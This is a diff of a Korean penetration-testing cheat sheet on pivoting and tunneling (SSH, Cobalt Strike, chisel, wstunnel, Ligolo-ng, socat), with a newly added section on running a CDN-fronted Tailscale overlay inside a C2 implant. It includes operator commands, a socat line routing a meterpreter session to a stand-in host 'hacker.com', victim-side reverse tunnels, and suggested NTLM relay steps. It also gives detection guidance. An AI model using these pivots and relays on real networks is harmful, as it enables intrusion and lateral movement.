@@ -5,13 +5,13 @@
 ## Nmap 팁
 
 > [!WARNING]
-> Nmap의 proxy 지원은 TCP 연결로 제한되며 ping, 포트 또는 OS 탐지 스캔에는 영향을 주지 않습니다. scanner가 SOCKS proxy 뒤에 있는 경우 **host discovery를 비활성화**하고 (`-Pn`) **TCP connect scan**을 사용하세요 (`-sT`).<sup>[[5]](#references)</sup>
+> Nmap의 proxy 지원은 TCP connections로 제한되며 ping, port 또는 OS-detection scans에는 영향을 주지 않습니다. scanner가 SOCKS proxy 뒤에 있는 경우 **host discovery를 비활성화** (`-Pn`)하고 **TCP connect scan** (`-sT`)을 사용하세요.<sup>[[5]](#references)</sup>
 
 ## **Bash**
 
 **Host -> Jump -> InternalA -> InternalB**
 
-최종 명령은 Evil-WinRM의 `-u` 및 `-i` 옵션을 사용하여 계정과 WinRM host를 식별합니다. 기본 WinRM 포트는 5985입니다.<sup>[[4]](#references)</sup>
+최종 command는 계정과 WinRM host를 식별하기 위해 Evil-WinRM의 `-u` 및 `-i` options를 사용하며, 기본 WinRM port는 5985입니다.<sup>[[4]](#references)</sup>
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -29,11 +29,11 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-OpenSSH는 암호화된 channel을 통해 X11 연결, 임의의 TCP 포트 및 Unix-domain socket을 forward할 수 있습니다.<sup>[[6]](#references)</sup>
+OpenSSH는 암호화된 채널을 통해 X11 연결, 임의의 TCP 포트 및 Unix-domain socket을 전달할 수 있습니다.<sup>[[6]](#references)</sup>
 
 SSH 그래픽 연결(X)
 
-`-Y`는 trusted X11 forwarding을 활성화하고, `-C`는 forwarded data에 대한 compression을 요청합니다.<sup>[[6]](#references)</sup>
+`-Y`는 신뢰된 X11 forwarding을 활성화하고, `-C`는 전달되는 데이터의 compression을 요청합니다.<sup>[[6]](#references)</sup>
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
@@ -51,9 +51,9 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-로컬 포트 --> 침해된 호스트 (SSH) --> Third_box:Port
+Local port --> Compromised host (SSH) --> Third_box:Port
 
-로컬 (`-L`) forwarding은 client에서 listen하고 SSH server 측에서 destination에 연결합니다.<sup>[[6]](#references)</sup>
+Local (`-L`) forwarding은 클라이언트에서 수신 대기하고 SSH 서버 측에서 대상에 연결합니다.<sup>[[6]](#references)</sup>
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -61,15 +61,15 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-로컬 포트 --> Compromised host (SSH) --> 어디든지
+Local Port --> Compromised host (SSH) --> Wherever
 
-Dynamic (`-D`) forwarding은 원격 측에서 연결이 열리는 로컬 SOCKS4/SOCKS5 listener를 생성합니다.<sup>[[6]](#references)</sup>
+Dynamic (`-D`) forwarding은 remote side에서 connection이 열리는 local SOCKS4/SOCKS5 listener를 생성합니다.<sup>[[6]](#references)</sup>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 ### ProxyJump를 사용한 Multi-hop
 
-`-J`/`ProxyJump`는 하나 이상의 쉼표로 구분된 jump host를 통해 target에 연결합니다. Forwarding 옵션은 최종 SSH connection에 적용되므로, 아래의 SOCKS listener는 첫 번째 bastion이 아니라 `internal-target`에서 destinations를 엽니다. 이를 통해 jump host에 로그인한 후 그곳에서 두 번째 SSH client를 시작할 필요가 없습니다.<sup>[[6]](#references)</sup>
+`-J`/`ProxyJump`는 하나 이상의 쉼표로 구분된 jump host를 거쳐 target에 연결합니다. Forwarding 옵션은 여전히 최종 SSH 연결에 속하므로, 아래의 SOCKS listener는 첫 번째 bastion이 아니라 `internal-target`에서 destination을 엽니다. 따라서 jump host에 로그인한 후 그곳에서 두 번째 SSH client를 시작할 필요가 없습니다.<sup>[[6]](#references)</sup>
 ```bash
 # Reach the final SSH server through two bastions
 ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target
@@ -77,13 +77,13 @@ ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target
 # Create a local SOCKS proxy whose connections exit from internal-target
 ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
 ```
-점프 머신에 대한 호스트별 옵션은 `~/.ssh/config`에 배치해야 합니다. 대상에 적용할 목적의 명령줄 설정은 중간 호스트에 자동으로 적용되지 않습니다.<sup>[[6]](#references)</sup>
+Jump machine별 옵션은 `~/.ssh/config`에 배치해야 합니다. destination을 대상으로 한 명령줄 설정은 intermediate host에 자동으로 적용되지 않습니다.<sup>[[6]](#references)</sup>
 
 ### Reverse Port Forwarding
 
-이는 DMZ를 거쳐 내부 호스트에서 사용자의 호스트로 reverse shells를 가져오는 데 유용합니다.
+이는 DMZ를 통해 internal host에서 사용자의 host로 reverse shell을 가져올 때 유용합니다:
 
-서버의 `GatewayPorts` 설정은 remote forward가 loopback 범위를 넘어 바인딩될 수 있는지를 제어하며, 기본값은 `no`입니다.<sup>[[7]](#references)</sup>
+서버의 `GatewayPorts` 설정은 remote forward가 loopback 외부에 bind될 수 있는지를 제어하며, 기본값은 `no`입니다.<sup>[[7]](#references)</sup>
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -94,7 +94,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-이 root 기반 예제는 양쪽 호스트에 tunnel device를 생성합니다. 서버는 tun forwarding을 허용해야 하며, 선택한 account에는 tun device에 대한 access 권한이 있어야 합니다. 여기서 `root` account를 사용하는 한 가지 방법은 `PermitRootLogin yes`입니다.<sup>[[6]](#references)[[7]](#references)</sup>\
+이 root 기반 예제는 두 호스트 모두에 tunnel device를 생성합니다. 서버는 tun forwarding을 허용해야 하며 선택한 account에는 tun device에 대한 access 권한이 있어야 합니다. 여기서는 `root` account를 사용하는 한 가지 방법으로 `PermitRootLogin yes`를 설정할 수 있습니다.<sup>[[6]](#references)[[7]](#references)</sup>\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -104,41 +104,41 @@ ip link set tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ip link set tun0 up #Activate the server side network interface
 ```
-서버 측에서 forwarding 활성화
+Server 측에서 forwarding 활성화
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-클라이언트 측에서 새 라우트 설정
+클라이언트 측에서 새 route를 설정합니다
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
-> **Security – Terrapin Attack (CVE-2023-48795)**
-> OpenSSH 9.6은 Terrapin의 early-transport integrity attack에 대응하기 위해 strict-KEX extension을 추가했습니다. 가능한 경우 양쪽 peer를 모두 업데이트하고, 이전 구현에서는 forwarded channel이 버전만으로 보호된다고 가정하지 말고 vendor guidance를 따르세요.<sup>[[8]](#references)</sup>
+> **보안 – Terrapin Attack (CVE-2023-48795)**
+> OpenSSH 9.6에는 Terrapin의 early-transport integrity attack에 대응하기 위한 strict-KEX 확장이 추가되었습니다. 가능한 경우 양쪽 peer를 모두 업데이트하고, 이전 구현에서는 forwarded channel이 버전만으로 보호된다고 가정하지 말고 vendor guidance를 따르세요.<sup>[[8]](#references)</sup>
 
 ## SSHUTTLE
 
-호스트를 거쳐 **ssh**를 통해 **subnetwork**으로 향하는 모든 **traffic**을 **tunnel**할 수 있습니다.\
+호스트를 통해 **ssh**로 **subnetwork**로 향하는 모든 **traffic**을 **tunnel**할 수 있습니다.\
 예를 들어 10.10.10.0/24로 향하는 모든 traffic을 forwarding할 수 있습니다.
 
-`sshuttle`은 SSH를 통한 투명한 proxying을 제공하며, 아래와 같이 subnet과 custom SSH command를 선택할 수 있습니다.<sup>[[9]](#references)</sup>
+`sshuttle`은 SSH를 통한 transparent proxying을 제공하며, 아래와 같이 subnet과 custom SSH command를 선택할 수 있습니다.<sup>[[9]](#references)</sup>
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-개인 키로 연결
+프라이빗 키로 연결
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
 ```
 ## Meterpreter
 
-Metasploit의 `portfwd`는 local 및 remote forwarding을 지원하며, SOCKS proxy module은 session routes 또는 `autoroute`와 함께 작동하도록 설계되었습니다. 아래 예시에서는 기본적으로 port 1080에서 listen합니다.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>
+Metasploit의 `portfwd`는 local 및 remote forwarding을 지원하며, SOCKS proxy module은 session routes 또는 `autoroute`와 함께 작동하도록 설계되었습니다. 이 예시에서는 기본적으로 port 1080에서 listen합니다.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>
 
 ### Port2Port
 
-Local port --> Compromised host (active session) --> Third_box:Port
+로컬 port --> Compromised host (active session) --> Third_box:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -170,7 +170,7 @@ Cobalt Strike의 Beacon은 Beacon을 통해 SOCKS4a/SOCKS5 연결을 relay할 �
 
 ### SOCKS proxy
 
-Beacon을 통해 traffic을 route해야 하는 interface의 Team Server에서 port를 엽니다.<sup>[[13]](#references)</sup>
+Beacon을 통해 traffic을 route해야 하는 interfaces에서 Team Server의 port를 엽니다.<sup>[[13]](#references)</sup>
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -181,16 +181,16 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> 이 경우 **port는 Team Server가 아니라 Beacon host에서 열리며**, traffic은 Team Server로 전송된 다음 그곳에서 지정된 host:port로 전달됩니다.<sup>[[14]](#references)</sup>
+> 이 경우 **port는 Team Server가 아닌 Beacon host에서 열리며**, traffic은 Team Server로 전송된 후 그곳에서 지정된 host:port로 전달됩니다.<sup>[[14]](#references)</sup>
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-reverse-forwarding 매뉴얼은 다음 동작을 설명합니다:<sup>[[14]](#references)</sup>
+reverse-forwarding 매뉴얼에는 다음 동작이 설명되어 있습니다:<sup>[[14]](#references)</sup>
 
-- Beacon의 reverse port forward는 **개별 머신 간 relay가 아니라 Team Server로 traffic을 tunnel하는 용도**로 설계되었습니다.
+- Beacon의 reverse port forward는 **개별 머신 간 relay가 아니라 Team Server로 traffic을 tunnel하기 위한 것**입니다.
 - Traffic은 P2P links를 포함하여 **Beacon의 C2 traffic 내부에서 tunnel됩니다**.
-- 높은 port는 일반적으로 privileged-port 제한을 피하지만, target OS policy와 기존 listener는 여전히 적용됩니다.
+- 높은 port는 일반적으로 privileged-port 제한을 피하지만, 대상 OS policy와 기존 listener는 여전히 적용됩니다.
 
 ### rPort2Port local
 
@@ -200,18 +200,56 @@ reverse-forwarding 매뉴얼은 다음 동작을 설명합니다:<sup>[[14]](#re
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
+## BOFScale - CDN-fronted in-process tailnet
+
+[BOFScale](https://github.com/NetSPI/BOFscale)는 TUN driver나 service를 설치하지 않고 Windows C2 implant 내부에서 수정된 Tailscale overlay를 실행합니다. 세 가지 구성 요소는 비동기 CGo `c-shared` `tailscaled` BOF-PE, local API와 통신하는 소형 C++ BOF-PE, 그리고 비동기 `socksportfwd` TCP-to-SOCKS5 bridge입니다.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### CDN-compatible TS2021 and DERP
+
+Tailscale은 일반적으로 Noise 기반 TS2021 control channel과 DERP relay에 proprietary HTTP upgrade를 사용합니다. BOFScale은 이러한 byte stream을 유지하면서 RFC 6455 WebSocket으로 전달하고, `Sec-WebSocket-Protocol: ts2021` 또는 `derp`를 사용합니다. 이를 통해 operator가 제어하는 Headscale/DERP origin을 표준 WebSocket upgrade만 허용하는 CDN 뒤에 배치할 수 있습니다. patched client는 HTTP `500` 이후 TS2021을 WebSocket으로 재시도하고, HTTP `426` 이후 DERP를 재시도하며, DERP WebSocket dialer가 host proxy configuration을 따르도록 합니다. 또한 BOF는 첫 번째 시도가 알려진 대로 실패하는 것을 건너뛰기 위해 `TS_DEBUG_DERP_WS_CLIENT=1`을 설정합니다.<sup>[[53]](#references)[[54]](#references)</sup>
+
+CDN과 origin proxy는 `/ts2021` 및 `/derp`에 대한 WebSocket upgrade를 유지하고, `/key`를 일반 HTTP로 전달하며, relay session이 무기한 열린 상태로 유지될 수 있으므로 internal read/write timeout을 비활성화해야 합니다. 제공된 Headscale configuration은 `verify_clients`를 활성화하고, operator의 embedded DERP map만 게시하며, Tailscale이 운영하는 relay로 fallback하는 것을 방지하기 위해 `derp.urls`를 비워 둡니다.<sup>[[53]](#references)[[54]](#references)</sup>
+
+### In-process daemon and named-pipe control
+
+별도로 지정하지 않으면 BOF entry point는 `-tun=userspace-networking`, `-state mem:`, `-no-logs-no-support` 옵션으로 `tailscaled`를 시작한 다음 UUID 이름의 pipe를 생성합니다. Go stdout/stderr를 OS pipe를 통해 Beacon output API로 redirect하므로, 전체 daemon과 Go runtime은 메모리에 상주하지만 state와 logs는 Tailscale directory에 기록되지 않습니다.<sup>[[53]](#references)[[54]](#references)</sup>
+
+경량 client는 해당 pipe를 통해 Tailscale의 HTTP/1.0 local API를 재현합니다. daemon의 `safesocket` layer가 pipe client를 impersonate하므로 `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`을 사용해 pipe를 열고, `Tailscale-Cap: 125`를 전송하며, local API를 `up`, `down`, `status`, route advertisement, shutdown operation에 매핑합니다.<sup>[[53]](#references)[[54]](#references)</sup>
+
+> [!WARNING]
+> daemon에 shutdown을 요청한 후 manually mapped Go BOF-PE를 unload하지 마십시오. runtime 및 garbage-collector goroutine이 loader가 unmap한 memory에서 계속 실행될 수 있습니다. `tailscaled`는 sacrificial process에서 실행하고, 최종 cleanup을 위해 해당 process를 terminate하십시오.<sup>[[54]](#references)</sup>
+
+### Bridge host-originated traffic through userspace SOCKS5
+
+Inbound tailnet connection과 advertised subnet route는 userspace network stack 내부에서 작동하지만, compromised host의 일반 process에는 overlay로 연결되는 OS route가 없습니다. 따라서 `socksportfwd`는 victim-facing TCP port에서 listen하고, daemon의 `0.0.0.0:1080` listener와 SOCKS5 `NO AUTH` negotiation을 수행하며, tailnet destination에 대해 `CONNECT`를 요청한 뒤 양방향으로 비동기 relay를 수행합니다. target이 MagicDNS name인 경우 `ATYP_DOMAIN`을 사용하므로 `tailscaled`가 해당 name을 resolve하고 Windows resolver에는 노출하지 않습니다.<sup>[[53]](#references)[[54]](#references)</sup>
+
+아래에는 최소한의 operator flow가 나와 있습니다. 이 CDN design을 통과하려면 operator node와 implant 모두 patched binary를 사용해야 합니다. stock Tailscale은 이 설계를 통해 통신할 수 없습니다.<sup>[[53]](#references)[[54]](#references)</sup>
+```bash
+HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
+# Start tailscaled as an asynchronous BOF and copy its printed pipe name
+tailscaled
+tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
+tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
+socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
+```
+로컬 forward는 겉으로 보이는 authentication listener와 relay tool을 분리할 수 있습니다. 시스템이 compromised host의 바인딩된 포트로 authenticate하도록 유도하고, 이를 tailnet을 통해 `ntlmrelayx`로 forward한 다음 AD CS, LDAP, HTTP, SMB 또는 기타 호환되는 target으로 relay할 수 있습니다. 취약점별 단계는 [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) 및 [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)를 참조하십시오. BOFScale은 transport일 뿐입니다.<sup>[[54]](#references)</sup>
+
+### Detection
+
+단일한 취약 indicator가 아니라 다음 조합을 대상으로 hunt하십시오. 일반적으로 Go 기반이 아닌 process에서 실행되는 Go runtime, permissive SDDL `D:(A;;GA;;;WD)`이 적용된 UUID pipe, 예상하지 못한 `0.0.0.0:1080` SOCKS listener, 그리고 CDN 주소로 연결되는 장시간 유지 TLS WebSockets입니다. TLS inspection을 사용하는 경우, 소유 process가 authorized `tailscaled` service가 아니라면 `Sec-WebSocket-Protocol: derp` 또는 `ts2021`을 flag하십시오. repository의 `bofscale.yar` rules는 세 가지 BOF-PE component 모두에 대한 memory signature를 제공합니다.<sup>[[53]](#references)[[54]](#references)</sup>
+
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-이 project는 `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, `tunnel.php`와 같은 web tunnel endpoint를 제공하며, local proxy를 시작하기 전에 지원되는 endpoint 하나를 업로드해야 합니다.<sup>[[15]](#references)</sup>
+이 project는 `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, `tunnel.php`와 같은 web tunnel endpoint를 제공합니다. 로컬 proxy를 시작하기 전에 지원되는 endpoint 하나를 upload해야 합니다.<sup>[[15]](#references)</sup>
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 releases 페이지에서 다운로드할 수 있습니다.\
-Chisel은 SSH로 보호된 연결을 통해 HTTP로 TCP/UDP 트래픽을 전달합니다. 호환되는 client/server 빌드를 사용하고 선택한 release의 command syntax를 확인하세요.<sup>[[16]](#references)</sup>
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 releases page에서 다운로드할 수 있습니다.\
+Chisel은 SSH로 보호되는 연결을 사용하여 HTTP를 통해 TCP/UDP 트래픽을 전달합니다. 호환되는 client/server 빌드를 사용하고 선택한 release의 command syntax를 확인하세요.<sup>[[16]](#references)</sup>
 
 ### socks
 ```bash
@@ -222,18 +260,18 @@ Chisel은 SSH로 보호된 연결을 통해 HTTP로 TCP/UDP 트래픽을 전달�
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Port forwarding
+### 포트 포워딩
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
 ```
 ## wstunnel
 
-[`wstunnel`](https://github.com/erebe/wstunnel)은 WebSocket, HTTP/2 또는 WebTransport(QUIC 기반 HTTP/3)를 통해 static 또는 dynamic forwards를 전달합니다. 현재 빌드는 forward 및 reverse 모드 모두에서 TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying, Linux transparent-proxy listeners를 지원합니다.<sup>[[52]](#references)</sup>
+[`wstunnel`](https://github.com/erebe/wstunnel)은 WebSocket, HTTP/2 또는 WebTransport(QUIC를 통한 HTTP/3)를 통해 static 또는 dynamic forwarding을 전달합니다. 현재 빌드는 forward 및 reverse 모드에서 TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying, Linux transparent-proxy listeners를 지원합니다.<sup>[[52]](#references)</sup>
 
 ### Reverse SOCKS5 pivot
 
-공격자 측에서 server를 실행하고 `-R`을 사용하여 pivot이 outbound로 연결하도록 합니다. 이 방향에서는 SOCKS5 listener가 **server**에 생성되며, 요청된 connection은 **client/pivot** 네트워크에서 시작됩니다.<sup>[[52]](#references)</sup>
+attacker에서 server를 실행하고 `-R`을 사용해 pivot이 outbound로 연결하도록 합니다. 이 방향에서는 SOCKS5 listener가 **server**에 생성되며, 요청된 연결은 **client/pivot** 네트워크에서 시작됩니다.<sup>[[52]](#references)</sup>
 ```bash
 # Attacker: use a certificate valid for pivot.example
 wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443
@@ -245,25 +283,25 @@ wstunnel client --tls-verify-certificate \
 # Attacker
 proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
 ```
-Reverse static forward는 동일한 방향을 사용합니다. 예를 들어 다음은 pivot이 도달할 수 있는 `10.10.10.20:445`를 attacker의 loopback 포트 `8445`에 노출합니다:<sup>[[52]](#references)</sup>
+Reverse static forward는 동일한 방향을 사용합니다. 예를 들어 다음은 pivot을 통해 접근 가능한 `10.10.10.20:445`를 공격자의 loopback 포트 `8445`로 노출합니다:<sup>[[52]](#references)</sup>
 ```bash
 wstunnel client --tls-verify-certificate \
 -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
 ```
-### Egress 및 transport 세부 정보
+### Egress 및 transport 세부 사항
 
-- 명시적인 HTTP proxy를 통과하려면 client에 `-p http://user:pass@proxy:8080`을 추가합니다. `curl`과 같은 client에서 `socks5h://127.0.0.1:1080`을 사용하거나 application에서 proxied DNS를 활성화하여, internal name이 local resolver로 유출되지 않고 tunnel 너머에서 resolve되도록 합니다.<sup>[[52]](#references)</sup>
-- `wss://`는 TLS로 보호되는 WebSocket을 선택합니다. `https://` client는 HTTP/2를 선택하지만, reverse proxy/CDN의 buffering 또는 HTTP/1 변환으로 인해 bidirectional stream이 일반적으로 중단됩니다. 이 mode를 테스트할 때는 wstunnel server를 직접 노출합니다.<sup>[[52]](#references)</sup>
-- `wts://`는 QUIC를 통한 WebTransport를 선택합니다. `--enable-webtransport` 또는 `wts://` listen URL을 사용하여 server를 시작하고, listening port에서 UDP를 허용합니다. 이 mode는 기존 HTTP `CONNECT` proxy를 통과할 수 없습니다. 해당 proxy는 TCP를 전달하기 때문입니다.<sup>[[52]](#references)</sup>
+- 명시적인 HTTP proxy를 통과하려면 client에 `-p http://user:pass@proxy:8080`을 추가합니다. `curl`과 같은 client에서 `socks5h://127.0.0.1:1080`을 사용하거나 proxied DNS를 활성화하여, internal name이 local resolver로 leak되지 않고 tunnel 너머에서 resolve되도록 합니다.<sup>[[52]](#references)</sup>
+- `wss://`는 TLS로 보호되는 WebSocket을 선택합니다. `https://` client는 HTTP/2를 선택하지만, reverse proxy/CDN에 의한 buffering 또는 HTTP/1 변환으로 bidirectional stream이 일반적으로 중단될 수 있습니다. 이 mode를 테스트할 때는 wstunnel server를 직접 노출합니다.<sup>[[52]](#references)</sup>
+- `wts://`는 QUIC을 통한 WebTransport를 선택합니다. `--enable-webtransport` 또는 `wts://` listen URL을 사용하여 server를 시작하고 listening port에서 UDP를 허용합니다. 이 mode는 일반적인 HTTP `CONNECT` proxy를 통과할 수 없습니다. 해당 proxy는 TCP를 전달하기 때문입니다.<sup>[[52]](#references)</sup>
 
 > [!WARNING]
-> upstream project는 내장된 self-signed certificate를 privacy 보호 수단으로 취급하지 말라고 경고합니다. 유효한 custom certificate와 `--tls-verify-certificate` 또는 mTLS를 우선 사용하고, remote access가 의도된 경우가 아니라면 proxy listener를 loopback에 유지하며, confidentiality가 중요한 경우 이미 secure한 protocol을 tunnel링합니다.<sup>[[52]](#references)</sup>
+> upstream project는 내장된 self-signed certificate를 privacy protection으로 취급하지 말라고 경고합니다. 유효한 custom certificate와 `--tls-verify-certificate`(또는 mTLS)를 우선 사용하고, remote access가 의도된 경우가 아니라면 proxy listener를 loopback에 유지하며, confidentiality가 중요한 경우 이미 secure한 protocol을 tunnel링합니다.<sup>[[52]](#references)</sup>
 
 ## Ligolo-ng
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-Ligolo-ng quickstart에서는 proxy의 TUN interface, agent에 대한 certificate-fingerprint validation, 그리고 tunneled network를 위한 route 설정을 설명합니다.<sup>[[17]](#references)</sup>
+Ligolo-ng quickstart에서는 proxy의 TUN interface, agent에 대한 certificate-fingerprint validation, 그리고 tunneled network를 위한 route setup을 설명합니다.<sup>[[17]](#references)</sup>
 
 ### Tunneling
 ```bash
@@ -287,9 +325,9 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Agent Binding and Listening
+### Agent Binding 및 Listening
 
-Ligolo-ng는 agent에 listener를 추가하여 proxy 측 주소로 forward할 수 있으며, 예약된 `240.0.0.0/4` 대역을 라우팅하여 agent 로컬 services에 접근할 수 있습니다.<sup>[[18]](#references)[[19]](#references)</sup>
+Ligolo-ng는 agent에 listener를 추가하여 proxy 측 주소로 forward할 수 있으며, 예약된 `240.0.0.0/4` 범위를 routing하면 agent 로컬 service에 접근할 수 있습니다.<sup>[[18]](#references)[[19]](#references)</sup>
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -297,7 +335,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-### Agent의 로컬 포트 액세스
+### Agent의 로컬 포트에 접근
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
@@ -307,7 +345,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Rpivot은 victim에서 reverse tunnel을 시작하고 attacker의 loopback address에 SOCKS4 proxy를 노출합니다. 또한 README에는 NTLM-proxy credentials 및 hash options도 설명되어 있습니다.<sup>[[20]](#references)</sup>
+Rpivot은 피해자에서 reverse tunnel을 시작하고 공격자의 loopback address에 SOCKS4 proxy를 노출합니다. 또한 README에는 NTLM-proxy credentials 및 hash options도 설명되어 있습니다.<sup>[[20]](#references)</sup>
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -315,7 +353,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-**NTLM proxy**를 통한 Pivot
+**NTLM proxy를 통한 Pivot**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -327,7 +365,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-Socat은 `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, `PROXY`와 같은 address type을 조합하며, 아래 예제는 해당 문서화된 endpoint들을 결합합니다.<sup>[[21]](#references)</sup>
+Socat은 `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, `PROXY`와 같은 address type을 조합합니다. 아래 예제는 문서화된 이러한 endpoint를 조합한 것입니다.<sup>[[21]](#references)</sup>
 
 ### Bind shell
 ```bash
@@ -347,7 +385,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### SSL Socat를 통한 Meterpreter
+### SSL Socat을 통한 Meterpreter
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -357,7 +395,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-socat의 문서화된 `PROXY` 주소 유형을 사용하여 인증이 필요 없는 **프록시**를 통과하려면 피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행합니다.<sup>[[21]](#references)</sup>
+socat의 문서화된 `PROXY` address type을 사용하면 victim의 console에서 마지막 줄 대신 다음 줄을 실행하여 **인증되지 않은 proxy**를 통과할 수 있습니다.<sup>[[21]](#references)</sup>
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -365,9 +403,9 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh 콘솔**
 
-양쪽(Client 및 Server)에 인증서를 생성합니다.
+양쪽에서 인증서를 생성합니다: Client 및 Server
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
